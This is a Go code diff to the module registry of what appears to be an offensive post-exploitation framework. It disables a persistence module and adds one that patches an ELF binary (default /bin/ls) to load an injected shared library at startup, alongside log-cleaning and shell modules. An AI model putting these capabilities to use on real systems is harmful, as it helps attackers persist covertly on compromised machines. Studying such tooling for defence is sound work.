@@ -8,6 +8,7 @@ const (
 	ModCLEAN_LOG    = "clean_log"
 	ModLPE_SUGGEST  = "lpe_suggest"
 	ModPERSISTENCE  = "get_persistence"
+	ModELF_PATCH    = "elf_patch"
 	ModPROXY        = "run_proxy"
 	ModPORT_FWD     = "port_fwd"
 	ModSHELL        = "interactive_shell"
@@ -172,21 +173,50 @@ var Modules = map[string]*ModuleConfig{
 			IsInteractive: false,
 		},
 	},
-	ModPERSISTENCE: {
-		Name:     ModPERSISTENCE,
+	// ModPERSISTENCE: { // DISABLED: buggy module
+	// 	Name:     ModPERSISTENCE,
+	// 	Build:    "",
+	// 	Author:   "jm33-ng",
+	// 	Date:     "2020-01-25",
+	// 	Comment:  "Get persistence via built-in methods",
+	// 	IsLocal:  false,
+	// 	Platform: "Linux",
+	// 	Path:     "",
+	// 	Options: ModOptions{
+	// 		"method": &ModOption{
+	// 			Name: "method",
+	// 			Desc: fmt.Sprintf("Persistence method: profiles: %s; cron: %s; patcher: %s", PersistMethods["profiles"], PersistMethods["cron"], PersistMethods["patcher"]),
+	// 			Vals: []string{"profiles", "cron", "patcher"},
+	// 			Val:  "patcher",
+	// 		},
+	// 	},
+	// 	AgentConfig: AgentModuleConfig{
+	// 		Exec:          "built-in",
+	// 		Files:         []string{},
+	// 		InMemory:      false,
+	// 		Type:          "go",
+	// 		IsInteractive: false,
+	// 	},
+	// },
+	ModELF_PATCH: {
+		Name:     ModELF_PATCH,
 		Build:    "",
 		Author:   "jm33-ng",
-		Date:     "2020-01-25",
-		Comment:  "Get persistence via built-in methods",
+		Date:     "2024-12-19",
+		Comment:  "Patch an ELF binary to load a specified shared library on startup",
 		IsLocal:  false,
 		Platform: "Linux",
 		Path:     "",
 		Options: ModOptions{
-			"method": &ModOption{
-				Name: "method",
-				Desc: fmt.Sprintf("Persistence method: profiles: %s; cron: %s; patcher: %s", PersistMethods["profiles"], PersistMethods["cron"], PersistMethods["patcher"]),
-				Vals: []string{"profiles", "cron", "patcher"},
-				Val:  "patcher",
+			"elf_path": &ModOption{
+				Name: "elf_path",
+				Desc: "Path to the ELF binary to patch",
+				Val:  "/bin/ls",
+			},
+			"so_path": &ModOption{
+				Name: "so_path",
+				Desc: "Path to the shared library (.so) file to inject (use 'put' command to upload first)",
+				Val:  "",
 			},
 		},
 		AgentConfig: AgentModuleConfig{
